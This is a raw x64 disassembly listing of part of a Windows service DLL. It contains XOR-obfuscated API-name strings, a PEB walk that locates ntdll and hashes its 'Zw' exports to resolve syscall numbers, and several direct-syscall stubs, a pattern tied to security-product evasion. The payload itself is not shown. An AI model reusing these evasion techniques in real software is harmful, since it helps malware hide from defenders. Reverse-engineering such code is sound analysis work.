   180001f0a:	41 5e                	pop    %r14
   180001f0c:	41 5d                	pop    %r13
   180001f0e:	41 5c                	pop    %r12
   180001f10:	5f                   	pop    %rdi
   180001f11:	5e                   	pop    %rsi
   180001f12:	5b                   	pop    %rbx
   180001f13:	c3                   	ret
   180001f14:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001f19:	55                   	push   %rbp
   180001f1a:	48 8d ac 24 b0 fc ff 	lea    -0x350(%rsp),%rbp
   180001f21:	ff 
   180001f22:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   180001f29:	48 8b 05 d0 40 00 00 	mov    0x40d0(%rip),%rax        # 0x180006000
   180001f30:	48 33 c4             	xor    %rsp,%rax
   180001f33:	48 89 85 40 03 00 00 	mov    %rax,0x340(%rbp)
   180001f3a:	89 0d a4 41 00 00    	mov    %ecx,0x41a4(%rip)        # 0x1800060e4
   180001f40:	33 db                	xor    %ebx,%ebx
   180001f42:	89 8d 24 01 00 00    	mov    %ecx,0x124(%rbp)
   180001f48:	33 d2                	xor    %edx,%edx
   180001f4a:	44 89 85 34 01 00 00 	mov    %r8d,0x134(%rbp)
   180001f51:	48 8d 4c 24 31       	lea    0x31(%rsp),%rcx
   180001f56:	41 b8 ef 01 00 00    	mov    $0x1ef,%r8d
   180001f5c:	89 9d 30 01 00 00    	mov    %ebx,0x130(%rbp)
   180001f62:	c7 85 20 01 00 00 20 	movl   $0x20,0x120(%rbp)
   180001f69:	00 00 00 
   180001f6c:	48 c7 85 28 01 00 00 	movq   $0x7,0x128(%rbp)
   180001f73:	07 00 00 00 
   180001f77:	c7 85 38 01 00 00 b8 	movl   $0xbb8,0x138(%rbp)
   180001f7e:	0b 00 00 
   180001f81:	c7 44 24 20 ad 9b 8a 	movl   $0xad8a9bad,0x20(%rsp)
   180001f88:	ad 
   180001f89:	c7 44 24 24 9b 8c 88 	movl   $0x97888c9b,0x24(%rsp)
   180001f90:	97 
   180001f91:	c7 44 24 28 9d 9b ad 	movl   $0x8aad9b9d,0x28(%rsp)
   180001f98:	8a 
   180001f99:	c7 44 24 2c 9f 8a 8b 	movl   $0x8d8b8a9f,0x2c(%rsp)
   180001fa0:	8d 
   180001fa1:	c6 44 24 30 fe       	movb   $0xfe,0x30(%rsp)
   180001fa6:	e8 aa 15 00 00       	call   0x180003555
   180001fab:	33 d2                	xor    %edx,%edx
   180001fad:	88 9d 40 01 00 00    	mov    %bl,0x140(%rbp)
   180001fb3:	41 b8 ff 01 00 00    	mov    $0x1ff,%r8d
   180001fb9:	48 8d 8d 41 01 00 00 	lea    0x141(%rbp),%rcx
   180001fc0:	e8 90 15 00 00       	call   0x180003555
   180001fc5:	8a 44 1c 20          	mov    0x20(%rsp,%rbx,1),%al
   180001fc9:	34 fe                	xor    $0xfe,%al
   180001fcb:	88 84 1d 40 01 00 00 	mov    %al,0x140(%rbp,%rbx,1)
   180001fd2:	48 ff c3             	inc    %rbx
   180001fd5:	48 81 fb 00 02 00 00 	cmp    $0x200,%rbx
   180001fdc:	7c e7                	jl     0x180001fc5
   180001fde:	48 8b 0d 2b 48 00 00 	mov    0x482b(%rip),%rcx        # 0x180006810
   180001fe5:	48 8d 95 40 01 00 00 	lea    0x140(%rbp),%rdx
   180001fec:	ff 15 2e 20 00 00    	call   *0x202e(%rip)        # 0x180004020
   180001ff2:	48 8b 0d 27 48 00 00 	mov    0x4827(%rip),%rcx        # 0x180006820
   180001ff9:	48 8d 95 20 01 00 00 	lea    0x120(%rbp),%rdx
   180002000:	48 89 05 21 48 00 00 	mov    %rax,0x4821(%rip)        # 0x180006828
   180002007:	ff d0                	call   *%rax
   180002009:	48 8b 8d 40 03 00 00 	mov    0x340(%rbp),%rcx
   180002010:	48 33 cc             	xor    %rsp,%rcx
   180002013:	e8 58 06 00 00       	call   0x180002670
   180002018:	48 8b 9c 24 68 04 00 	mov    0x468(%rsp),%rbx
   18000201f:	00 
   180002020:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   180002027:	5d                   	pop    %rbp
   180002028:	c3                   	ret
   180002029:	cc                   	int3
   18000202a:	cc                   	int3
   18000202b:	cc                   	int3
   18000202c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002031:	55                   	push   %rbp
   180002032:	48 8d ac 24 50 fa ff 	lea    -0x5b0(%rsp),%rbp
   180002039:	ff 
   18000203a:	48 81 ec b0 06 00 00 	sub    $0x6b0,%rsp
   180002041:	48 8b 05 b8 3f 00 00 	mov    0x3fb8(%rip),%rax        # 0x180006000
   180002048:	48 33 c4             	xor    %rsp,%rax
   18000204b:	48 89 85 a0 05 00 00 	mov    %rax,0x5a0(%rbp)
   180002052:	48 8b da             	mov    %rdx,%rbx
   180002055:	e8 f2 f0 ff ff       	call   0x18000114c
   18000205a:	33 d2                	xor    %edx,%edx
   18000205c:	c6 85 a0 01 00 00 00 	movb   $0x0,0x1a0(%rbp)
   180002063:	41 b8 ff 01 00 00    	mov    $0x1ff,%r8d
   180002069:	48 8d 8d a1 01 00 00 	lea    0x1a1(%rbp),%rcx
   180002070:	e8 e0 14 00 00       	call   0x180003555
   180002075:	33 d2                	xor    %edx,%edx
   180002077:	c7 44 24 30 ac 9b 99 	movl   $0x97999bac,0x30(%rsp)
   18000207e:	97 
   18000207f:	41 b8 e4 01 00 00    	mov    $0x1e4,%r8d
   180002085:	c7 44 24 34 8d 8a 9b 	movl   $0x8c9b8a8d,0x34(%rsp)
   18000208c:	8c 
   18000208d:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   180002092:	c7 44 24 38 ad 9b 8c 	movl   $0x888c9bad,0x38(%rsp)
   180002099:	88 
   18000209a:	c7 44 24 3c 97 9d 9b 	movl   $0xbd9b9d97,0x3c(%rsp)
   1800020a1:	bd 
   1800020a2:	c7 44 24 40 8a 8c 92 	movl   $0xb6928c8a,0x40(%rsp)
   1800020a9:	b6 
   1800020aa:	c7 44 24 44 9f 90 9a 	movl   $0x929a909f,0x44(%rsp)
   1800020b1:	92 
   1800020b2:	c7 44 24 48 9b 8c a9 	movl   $0xfea98c9b,0x48(%rsp)
   1800020b9:	fe 
   1800020ba:	e8 96 14 00 00       	call   0x180003555
   1800020bf:	33 d2                	xor    %edx,%edx
   1800020c1:	8a 44 14 30          	mov    0x30(%rsp,%rdx,1),%al
   1800020c5:	34 fe                	xor    $0xfe,%al
   1800020c7:	88 84 15 a0 01 00 00 	mov    %al,0x1a0(%rbp,%rdx,1)
   1800020ce:	48 ff c2             	inc    %rdx
   1800020d1:	48 81 fa 00 02 00 00 	cmp    $0x200,%rdx
   1800020d8:	7c e7                	jl     0x1800020c1
   1800020da:	48 8b 0d 2f 47 00 00 	mov    0x472f(%rip),%rcx        # 0x180006810
   1800020e1:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   1800020e8:	ff 15 32 1f 00 00    	call   *0x1f32(%rip)        # 0x180004020
   1800020ee:	48 8b 0b             	mov    (%rbx),%rcx
   1800020f1:	48 8d 15 14 01 00 00 	lea    0x114(%rip),%rdx        # 0x18000220c
   1800020f8:	48 89 05 31 47 00 00 	mov    %rax,0x4731(%rip)        # 0x180006830
   1800020ff:	ff d0                	call   *%rax
   180002101:	48 89 05 18 47 00 00 	mov    %rax,0x4718(%rip)        # 0x180006820
   180002108:	48 85 c0             	test   %rax,%rax
   18000210b:	0f 84 db 00 00 00    	je     0x1800021ec
   180002111:	b9 02 00 00 00       	mov    $0x2,%ecx
   180002116:	44 8d 41 ff          	lea    -0x1(%rcx),%r8d
   18000211a:	e8 f5 fd ff ff       	call   0x180001f14
   18000211f:	45 33 c0             	xor    %r8d,%r8d
   180002122:	41 8d 48 04          	lea    0x4(%r8),%ecx
   180002126:	e8 e9 fd ff ff       	call   0x180001f14
   18000212b:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   180002130:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002135:	e8 b2 f7 ff ff       	call   0x1800018ec
   18000213a:	85 c0                	test   %eax,%eax
   18000213c:	0f 95 c3             	setne  %bl
   18000213f:	b9 c0 27 09 00       	mov    $0x927c0,%ecx
   180002144:	ff 15 de 1e 00 00    	call   *0x1ede(%rip)        # 0x180004028
   18000214a:	33 d2                	xor    %edx,%edx
   18000214c:	c6 85 a0 01 00 00 00 	movb   $0x0,0x1a0(%rbp)
   180002153:	41 b8 ff 03 00 00    	mov    $0x3ff,%r8d
   180002159:	48 8d 8d a1 01 00 00 	lea    0x1a1(%rbp),%rcx
   180002160:	e8 f0 13 00 00       	call   0x180003555
   180002165:	33 d2                	xor    %edx,%edx
   180002167:	c6 85 30 01 00 00 00 	movb   $0x0,0x130(%rbp)
   18000216e:	48 8d 8d 31 01 00 00 	lea    0x131(%rbp),%rcx
   180002175:	44 8d 42 63          	lea    0x63(%rdx),%r8d
   180002179:	e8 d7 13 00 00       	call   0x180003555
   18000217e:	33 c9                	xor    %ecx,%ecx
   180002180:	48 8d 05 d1 3f 00 00 	lea    0x3fd1(%rip),%rax        # 0x180006158
   180002187:	8a 04 01             	mov    (%rcx,%rax,1),%al
   18000218a:	34 dd                	xor    $0xdd,%al
   18000218c:	88 84 0d 30 01 00 00 	mov    %al,0x130(%rbp,%rcx,1)
   180002193:	48 ff c1             	inc    %rcx
   180002196:	48 83 f9 0d          	cmp    $0xd,%rcx
   18000219a:	7c e4                	jl     0x180002180
   18000219c:	33 c9                	xor    %ecx,%ecx
   18000219e:	8a 84 0d 30 01 00 00 	mov    0x130(%rbp,%rcx,1),%al
   1800021a5:	88 84 0d a0 01 00 00 	mov    %al,0x1a0(%rbp,%rcx,1)
   1800021ac:	48 ff c1             	inc    %rcx
   1800021af:	84 c0                	test   %al,%al
   1800021b1:	75 eb                	jne    0x18000219e
   1800021b3:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   1800021ba:	e8 5d f4 ff ff       	call   0x18000161c
   1800021bf:	84 db                	test   %bl,%bl
   1800021c1:	74 06                	je     0x1800021c9
   1800021c3:	3b 44 24 20          	cmp    0x20(%rsp),%eax
   1800021c7:	74 0f                	je     0x1800021d8
   1800021c9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800021ce:	e8 19 f7 ff ff       	call   0x1800018ec
   1800021d3:	85 c0                	test   %eax,%eax
   1800021d5:	0f 95 c3             	setne  %bl
   1800021d8:	8b 05 06 3f 00 00    	mov    0x3f06(%rip),%eax        # 0x1800060e4
   1800021de:	83 f8 03             	cmp    $0x3,%eax
   1800021e1:	74 09                	je     0x1800021ec
   1800021e3:	83 f8 01             	cmp    $0x1,%eax
   1800021e6:	0f 85 53 ff ff ff    	jne    0x18000213f
   1800021ec:	48 8b 8d a0 05 00 00 	mov    0x5a0(%rbp),%rcx
   1800021f3:	48 33 cc             	xor    %rsp,%rcx
   1800021f6:	e8 75 04 00 00       	call   0x180002670
   1800021fb:	48 8b 9c 24 c0 06 00 	mov    0x6c0(%rsp),%rbx
   180002202:	00 
   180002203:	48 81 c4 b0 06 00 00 	add    $0x6b0,%rsp
   18000220a:	5d                   	pop    %rbp
   18000220b:	c3                   	ret
   18000220c:	48 83 ec 28          	sub    $0x28,%rsp
   180002210:	83 e9 01             	sub    $0x1,%ecx
   180002213:	74 3b                	je     0x180002250
   180002215:	83 e9 01             	sub    $0x1,%ecx
   180002218:	74 21                	je     0x18000223b
   18000221a:	83 e9 01             	sub    $0x1,%ecx
   18000221d:	74 07                	je     0x180002226
   18000221f:	83 f9 02             	cmp    $0x2,%ecx
   180002222:	75 52                	jne    0x180002276
   180002224:	eb 43                	jmp    0x180002269
   180002226:	b9 05 00 00 00       	mov    $0x5,%ecx
   18000222b:	44 8d 41 fc          	lea    -0x4(%rcx),%r8d
   18000222f:	e8 e0 fc ff ff       	call   0x180001f14
   180002234:	b9 04 00 00 00       	mov    $0x4,%ecx
   180002239:	eb 33                	jmp    0x18000226e
   18000223b:	b9 06 00 00 00       	mov    $0x6,%ecx
   180002240:	44 8d 41 fb          	lea    -0x5(%rcx),%r8d
   180002244:	e8 cb fc ff ff       	call   0x180001f14
   180002249:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000224e:	eb 1e                	jmp    0x18000226e
   180002250:	b9 03 00 00 00       	mov    $0x3,%ecx
   180002255:	44 8d 41 fe          	lea    -0x2(%rcx),%r8d
   180002259:	e8 b6 fc ff ff       	call   0x180001f14
   18000225e:	b9 0a 00 00 00       	mov    $0xa,%ecx
   180002263:	ff 15 bf 1d 00 00    	call   *0x1dbf(%rip)        # 0x180004028
   180002269:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000226e:	45 33 c0             	xor    %r8d,%r8d
   180002271:	e8 9e fc ff ff       	call   0x180001f14
   180002276:	48 83 c4 28          	add    $0x28,%rsp
   18000227a:	c3                   	ret
   18000227b:	cc                   	int3
   18000227c:	48 8b c4             	mov    %rsp,%rax
   18000227f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180002283:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180002287:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000228b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000228f:	41 55                	push   %r13
   180002291:	41 56                	push   %r14
   180002293:	83 3d a6 45 00 00 00 	cmpl   $0x0,0x45a6(%rip)        # 0x180006840
   18000229a:	0f 85 8c 01 00 00    	jne    0x18000242c
   1800022a0:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   1800022a7:	00 00 
   1800022a9:	33 d2                	xor    %edx,%edx
   1800022ab:	48 8b 48 18          	mov    0x18(%rax),%rcx
   1800022af:	4c 8b 49 10          	mov    0x10(%rcx),%r9
   1800022b3:	49 8b 41 30          	mov    0x30(%r9),%rax
   1800022b7:	48 85 c0             	test   %rax,%rax
   1800022ba:	0f 84 8a 01 00 00    	je     0x18000244a
   1800022c0:	41 ba 20 20 20 20    	mov    $0x20202020,%r10d
   1800022c6:	4c 8b c0             	mov    %rax,%r8
   1800022c9:	48 63 40 3c          	movslq 0x3c(%rax),%rax
   1800022cd:	42 8b 8c 00 88 00 00 	mov    0x88(%rax,%r8,1),%ecx
   1800022d4:	00 
   1800022d5:	85 c9                	test   %ecx,%ecx
   1800022d7:	74 24                	je     0x1800022fd
   1800022d9:	49 8d 14 08          	lea    (%r8,%rcx,1),%rdx
   1800022dd:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   1800022e0:	42 8b 04 01          	mov    (%rcx,%r8,1),%eax
   1800022e4:	41 0b c2             	or     %r10d,%eax
   1800022e7:	3d 6e 74 64 6c       	cmp    $0x6c64746e,%eax
   1800022ec:	75 0f                	jne    0x1800022fd
   1800022ee:	42 8b 44 01 04       	mov    0x4(%rcx,%r8,1),%eax
   1800022f3:	41 0b c2             	or     %r10d,%eax
   1800022f6:	3d 6c 2e 64 6c       	cmp    $0x6c642e6c,%eax
   1800022fb:	74 0c                	je     0x180002309
   1800022fd:	4d 8b 09             	mov    (%r9),%r9
   180002300:	49 8b 41 30          	mov    0x30(%r9),%rax
   180002304:	48 85 c0             	test   %rax,%rax
   180002307:	75 bd                	jne    0x1800022c6
   180002309:	48 85 d2             	test   %rdx,%rdx
   18000230c:	0f 84 38 01 00 00    	je     0x18000244a
   180002312:	8b 7a 1c             	mov    0x1c(%rdx),%edi
   180002315:	4c 8d 2d 24 45 00 00 	lea    0x4524(%rip),%r13        # 0x180006840
   18000231c:	44 8b 5a 20          	mov    0x20(%rdx),%r11d
   180002320:	49 03 f8             	add    %r8,%rdi
   180002323:	8b 72 24             	mov    0x24(%rdx),%esi
   180002326:	4d 03 d8             	add    %r8,%r11
   180002329:	8b 5a 18             	mov    0x18(%rdx),%ebx
   18000232c:	49 03 f0             	add    %r8,%rsi
   18000232f:	33 d2                	xor    %edx,%edx
   180002331:	8d 43 ff             	lea    -0x1(%rbx),%eax
   180002334:	45 8b 0c 83          	mov    (%r11,%rax,4),%r9d
   180002338:	8b d8                	mov    %eax,%ebx
   18000233a:	4d 03 c8             	add    %r8,%r9
   18000233d:	44 8b f0             	mov    %eax,%r14d
   180002340:	b8 5a 77 00 00       	mov    $0x775a,%eax
   180002345:	66 41 39 01          	cmp    %ax,(%r9)
   180002349:	75 51                	jne    0x18000239c
   18000234b:	33 ed                	xor    %ebp,%ebp
   18000234d:	41 ba 4e bf 6f 2d    	mov    $0x2d6fbf4e,%r10d
   180002353:	41 38 29             	cmp    %bpl,(%r9)
   180002356:	74 1d                	je     0x180002375
   180002358:	49 8b c1             	mov    %r9,%rax
   18000235b:	0f b7 00             	movzwl (%rax),%eax
   18000235e:	41 8b ca             	mov    %r10d,%ecx
   180002361:	c1 c9 08             	ror    $0x8,%ecx
   180002364:	ff c5                	inc    %ebp
   180002366:	03 c8                	add    %eax,%ecx
   180002368:	8b c5                	mov    %ebp,%eax
   18000236a:	49 03 c1             	add    %r9,%rax
   18000236d:	44 33 d1             	xor    %ecx,%r10d
   180002370:	80 38 00             	cmpb   $0x0,(%rax)
   180002373:	75 e6                	jne    0x18000235b
   180002375:	8b ca                	mov    %edx,%ecx
   180002377:	ff c2                	inc    %edx
   180002379:	48 03 c9             	add    %rcx,%rcx
   18000237c:	45 89 54 cd 08       	mov    %r10d,0x8(%r13,%rcx,8)
   180002381:	42 0f b7 04 76       	movzwl (%rsi,%r14,2),%eax
   180002386:	8b 04 87             	mov    (%rdi,%rax,4),%eax
   180002389:	49 83 64 cd 10 00    	andq   $0x0,0x10(%r13,%rcx,8)
   18000238f:	41 89 44 cd 0c       	mov    %eax,0xc(%r13,%rcx,8)
   180002394:	81 fa f4 01 00 00    	cmp    $0x1f4,%edx
   18000239a:	74 04                	je     0x1800023a0
   18000239c:	85 db                	test   %ebx,%ebx
   18000239e:	75 91                	jne    0x180002331
   1800023a0:	45 33 c0             	xor    %r8d,%r8d
   1800023a3:	89 15 97 44 00 00    	mov    %edx,0x4497(%rip)        # 0x180006840
   1800023a9:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1800023ac:	85 c0                	test   %eax,%eax
   1800023ae:	74 7c                	je     0x18000242c
   1800023b0:	8b c2                	mov    %edx,%eax
   1800023b2:	33 c9                	xor    %ecx,%ecx
   1800023b4:	41 2b c0             	sub    %r8d,%eax
   1800023b7:	83 f8 01             	cmp    $0x1,%eax
   1800023ba:	74 65                	je     0x180002421
   1800023bc:	44 8d 59 01          	lea    0x1(%rcx),%r11d
   1800023c0:	44 8b d1             	mov    %ecx,%r10d
   1800023c3:	4d 03 d2             	add    %r10,%r10
   1800023c6:	45 8b cb             	mov    %r11d,%r9d
   1800023c9:	4d 03 c9             	add    %r9,%r9
   1800023cc:	43 8b 7c d5 0c       	mov    0xc(%r13,%r10,8),%edi
   1800023d1:	43 8b 5c cd 0c       	mov    0xc(%r13,%r9,8),%ebx
   1800023d6:	3b fb                	cmp    %ebx,%edi
   1800023d8:	76 38                	jbe    0x180002412
   1800023da:	43 8b 54 d5 08       	mov    0x8(%r13,%r10,8),%edx
   1800023df:	43 8b 44 cd 08       	mov    0x8(%r13,%r9,8),%eax
   1800023e4:	4b 8b 4c d5 10       	mov    0x10(%r13,%r10,8),%rcx
   1800023e9:	43 89 44 d5 08       	mov    %eax,0x8(%r13,%r10,8)
   1800023ee:	4b 8b 44 cd 10       	mov    0x10(%r13,%r9,8),%rax
   1800023f3:	4b 89 44 d5 10       	mov    %rax,0x10(%r13,%r10,8)
   1800023f8:	43 89 5c d5 0c       	mov    %ebx,0xc(%r13,%r10,8)
   1800023fd:	43 89 54 cd 08       	mov    %edx,0x8(%r13,%r9,8)
   180002402:	43 89 7c cd 0c       	mov    %edi,0xc(%r13,%r9,8)
   180002407:	4b 89 4c cd 10       	mov    %rcx,0x10(%r13,%r9,8)
   18000240c:	8b 15 2e 44 00 00    	mov    0x442e(%rip),%edx        # 0x180006840
   180002412:	8b c2                	mov    %edx,%eax
   180002414:	41 8b cb             	mov    %r11d,%ecx
   180002417:	41 2b c0             	sub    %r8d,%eax
   18000241a:	ff c8                	dec    %eax
   18000241c:	44 3b d8             	cmp    %eax,%r11d
   18000241f:	72 9b                	jb     0x1800023bc
   180002421:	41 ff c0             	inc    %r8d
   180002424:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180002427:	44 3b c0             	cmp    %eax,%r8d
   18000242a:	72 84                	jb     0x1800023b0
   18000242c:	b8 01 00 00 00       	mov    $0x1,%eax
   180002431:	48 8b 5c 24 18       	mov    0x18(%rsp),%rbx
   180002436:	48 8b 6c 24 20       	mov    0x20(%rsp),%rbp
   18000243b:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   180002440:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   180002445:	41 5e                	pop    %r14
   180002447:	41 5d                	pop    %r13
   180002449:	c3                   	ret
   18000244a:	33 c0                	xor    %eax,%eax
   18000244c:	eb e3                	jmp    0x180002431
   18000244e:	cc                   	int3
   18000244f:	cc                   	int3
   180002450:	40 53                	rex push %rbx
   180002452:	48 83 ec 20          	sub    $0x20,%rsp
   180002456:	8b d9                	mov    %ecx,%ebx
   180002458:	e8 1f fe ff ff       	call   0x18000227c
   18000245d:	33 d2                	xor    %edx,%edx
   18000245f:	85 c0                	test   %eax,%eax
   180002461:	74 24                	je     0x180002487
   180002463:	44 8b 05 d6 43 00 00 	mov    0x43d6(%rip),%r8d        # 0x180006840
   18000246a:	45 85 c0             	test   %r8d,%r8d
   18000246d:	74 18                	je     0x180002487
   18000246f:	8b c2                	mov    %edx,%eax
   180002471:	48 8d 0d d0 43 00 00 	lea    0x43d0(%rip),%rcx        # 0x180006848
   180002478:	48 03 c0             	add    %rax,%rax
   18000247b:	3b 1c c1             	cmp    (%rcx,%rax,8),%ebx
   18000247e:	74 10                	je     0x180002490
   180002480:	ff c2                	inc    %edx
   180002482:	41 3b d0             	cmp    %r8d,%edx
   180002485:	72 e8                	jb     0x18000246f
   180002487:	83 c8 ff             	or     $0xffffffff,%eax
   18000248a:	48 83 c4 20          	add    $0x20,%rsp
   18000248e:	5b                   	pop    %rbx
   18000248f:	c3                   	ret
   180002490:	8b c2                	mov    %edx,%eax
   180002492:	eb f6                	jmp    0x18000248a
   180002494:	cc                   	int3
   180002495:	cc                   	int3
   180002496:	cc                   	int3
   180002497:	cc                   	int3
   180002498:	cc                   	int3
   180002499:	cc                   	int3
   18000249a:	cc                   	int3
   18000249b:	cc                   	int3
   18000249c:	cc                   	int3
   18000249d:	cc                   	int3
   18000249e:	cc                   	int3
   18000249f:	cc                   	int3
   1800024a0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800024a5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800024aa:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800024af:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800024b4:	48 83 ec 28          	sub    $0x28,%rsp
   1800024b8:	b9 0f 17 99 09       	mov    $0x999170f,%ecx
   1800024bd:	e8 8e ff ff ff       	call   0x180002450
   1800024c2:	48 83 c4 28          	add    $0x28,%rsp
   1800024c6:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1800024cb:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   1800024d0:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   1800024d5:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1800024da:	4c 8b d1             	mov    %rcx,%r10
   1800024dd:	0f 05                	syscall
   1800024df:	c3                   	ret
   1800024e0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800024e5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800024ea:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800024ef:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800024f4:	48 83 ec 28          	sub    $0x28,%rsp
   1800024f8:	b9 7b eb 95 8d       	mov    $0x8d95eb7b,%ecx
   1800024fd:	e8 4e ff ff ff       	call   0x180002450
   180002502:	48 83 c4 28          	add    $0x28,%rsp
   180002506:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   18000250b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002510:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002515:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000251a:	4c 8b d1             	mov    %rcx,%r10
   18000251d:	0f 05                	syscall
   18000251f:	c3                   	ret
   180002520:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002525:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000252a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000252f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180002534:	48 83 ec 28          	sub    $0x28,%rsp
   180002538:	b9 34 44 b9 45       	mov    $0x45b94434,%ecx
   18000253d:	e8 0e ff ff ff       	call   0x180002450
   180002542:	48 83 c4 28          	add    $0x28,%rsp
   180002546:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   18000254b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002550:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002555:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000255a:	4c 8b d1             	mov    %rcx,%r10
   18000255d:	0f 05                	syscall
   18000255f:	c3                   	ret
   180002560:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002565:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000256a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000256f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180002574:	48 83 ec 28          	sub    $0x28,%rsp
   180002578:	b9 1b 01 97 05       	mov    $0x597011b,%ecx
   18000257d:	e8 ce fe ff ff       	call   0x180002450
   180002582:	48 83 c4 28          	add    $0x28,%rsp
   180002586:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   18000258b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002590:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002595:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000259a:	4c 8b d1             	mov    %rcx,%r10
   18000259d:	0f 05                	syscall
   18000259f:	c3                   	ret
   1800025a0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800025a5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800025aa:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800025af:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800025b4:	48 83 ec 28          	sub    $0x28,%rsp
   1800025b8:	b9 1e 1a bf 42       	mov    $0x42bf1a1e,%ecx
   1800025bd:	e8 8e fe ff ff       	call   0x180002450
   1800025c2:	48 83 c4 28          	add    $0x28,%rsp
   1800025c6:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1800025cb:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   1800025d0:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   1800025d5:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1800025da:	4c 8b d1             	mov    %rcx,%r10
   1800025dd:	0f 05                	syscall
   1800025df:	c3                   	ret
   1800025e0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800025e5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800025ea:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800025ef:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800025f4:	48 83 ec 28          	sub    $0x28,%rsp
   1800025f8:	b9 9f 23 ce 00       	mov    $0xce239f,%ecx
   1800025fd:	e8 4e fe ff ff       	call   0x180002450
   180002602:	48 83 c4 28          	add    $0x28,%rsp
   180002606:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   18000260b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002610:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002615:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000261a:	4c 8b d1             	mov    %rcx,%r10
   18000261d:	0f 05                	syscall
   18000261f:	c3                   	ret
   180002620:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002625:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000262a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000262f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180002634:	48 83 ec 28          	sub    $0x28,%rsp
   180002638:	b9 75 38 db 02       	mov    $0x2db3875,%ecx
   18000263d:	e8 0e fe ff ff       	call   0x180002450
   180002642:	48 83 c4 28          	add    $0x28,%rsp
   180002646:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   18000264b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002650:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002655:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000265a:	4c 8b d1             	mov    %rcx,%r10
   18000265d:	0f 05                	syscall
   18000265f:	c3                   	ret
   180002660:	cc                   	int3
   180002661:	cc                   	int3
   180002662:	cc                   	int3
   180002663:	cc                   	int3
   180002664:	cc                   	int3
   180002665:	cc                   	int3
   180002666:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000266d:	00 00 00 
   180002670:	48 3b 0d 89 39 00 00 	cmp    0x3989(%rip),%rcx        # 0x180006000
   180002677:	75 10                	jne    0x180002689
   180002679:	48 c1 c1 10          	rol    $0x10,%rcx
   18000267d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   180002682:	75 01                	jne    0x180002685
